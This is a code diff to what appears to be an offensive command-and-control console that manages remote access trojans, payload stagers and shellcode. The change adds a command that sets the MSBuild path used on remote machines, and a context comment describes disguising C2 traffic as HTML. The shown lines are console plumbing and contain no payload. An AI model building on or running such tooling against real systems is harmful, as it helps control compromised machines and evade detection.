@@ -41,7 +41,8 @@ if(not str.startswith("http://", redirect_url) or not str.startswith("https://",
     redirect_url = "http://" + redirect_url
 
 supported_types = ["c", "c#", "js", "ps1", "hta"]
-msbuild_path = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild"
+default_msbuild_path = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild"
+msbuild_path = default_msbuild_path
 alpha = "abcdefghijklmnopqrstuvwxyz"
 
 # Generate a random path to serve payloads off of
@@ -62,7 +63,7 @@ notes = {}
 # Tab completion stuff -- https://stackoverflow.com/questions/5637124/tab-completion-in-pythons-raw-input
 class Completer(object):
     def __init__(self):
-        self.tab_cmds = ['all', 'rats', 'download', 'upload', 'psh', 'csharp', 'spawn', 'quit', 'back', 'exit', 'help', 'remove', 'clear', 'stagers', "shellcode", "eval", "note"]
+        self.tab_cmds = ['all', 'rats', 'download', 'upload', 'psh', 'csharp', 'spawn', 'quit', 'back', 'exit', 'help', 'remove', 'clear', 'stagers', "shellcode", "eval", "note", "set-msbuild-path"]
         self.re_space = re.compile('.*\s+$', re.M)
 
     def add_tab_item(self, item):
@@ -172,6 +173,20 @@ def pretty_print_banner():
     \_______/  \_______| \_______|\__|       \_______|   \____/ \_______/  v1.6.12 Speak no eeeeeeeval     "`
     """
     pretty_print(banner)
+
+def set_msbuild_path(inp):
+    global msbuild_path, default_msbuild_path
+    path = ' '.join(inp.split(" ")[1:])
+    if(path == "" or path == " "):
+        pretty_print("Usage: set-msbuild-path <remote_path_to_msbuild>")
+        pretty_print("Use \"set-msbuild-path default\" to restore to default")
+        return
+    if(path == "default"):
+        pretty_print("Resetting msbuild path to default: " + colors(default_msbuild_path))
+        msbuild_path = default_msbuild_path
+    else:
+        pretty_print("Setting msbuild path to " + colors(path))
+        msbuild_path = path
 
 # Wrap C2 comms in html and html2 code to make requests look more legitimate
 def htmlify(data):
@@ -639,6 +654,10 @@ if __name__ == "__main__":
             elif(inp == "help"):
                 get_help()
 
+            # Set the msbuild path
+            elif(str.startswith(inp, "set-msbuild-path")):
+                set_msbuild_path(inp)
+
             elif(str.startswith(inp, "stagers")):
                 try:
                     lhost = inp.split(" ")[1]
@@ -694,6 +713,11 @@ if __name__ == "__main__":
 
                         elif(inp == "help"):
                             get_help()
+                            continue
+
+                        # Set the msbuild path
+                        elif(str.startswith(inp, "set-msbuild-path")):
+                            set_msbuild_path(inp)
                             continue
 
                         elif(str.startswith(inp, "stagers")):
